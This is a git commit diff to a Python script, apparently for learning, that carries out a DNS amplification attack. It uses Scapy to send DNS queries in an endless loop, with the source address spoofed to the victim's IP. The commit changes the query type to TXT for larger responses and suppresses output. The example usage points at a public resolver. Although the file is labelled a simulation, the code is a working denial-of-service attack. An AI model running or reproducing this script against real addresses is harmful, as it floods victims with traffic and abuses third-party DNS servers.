e3164e595439484dbba63e50466aaa4696e13f93
Sok Keo Ponleou <ponleousk@gmail.com>
2024-06-01 14:26:45 +0700

    feat: optimized dns amplification simulation

--- attack_and_simulation/dns_amplification_simulation.py
+++ attack_and_simulation/dns_amplification_simulation.py
@@ -9,11 +9,12 @@ def dns_amplification(target_ip, dns_server, query_name="example.com"):
     # Construct a DNS query packet with a spoofed source IP
     ip = scp.IP(src=target_ip, dst=dns_server)
     udp = scp.UDP(dport=53)  # port for DNS server
-    dns = scp.DNS(rd=1, qd=scp.DNSQR(qname=query_name, qtype="ANY"))
+    dns = scp.DNS(rd=1, qd=scp.DNSQR(qname=query_name, qtype="TXT"))
+    # qtype TXT makes dns response the largest
     packet = ip / udp / dns
 
     # Send the packet
-    scp.send(packet, loop=1)
+    scp.send(packet, loop=1, verbose=0)
 
 
 # Example usage: dns_amplification('192.168.1.10', '8.8.8.8', 'example.com')
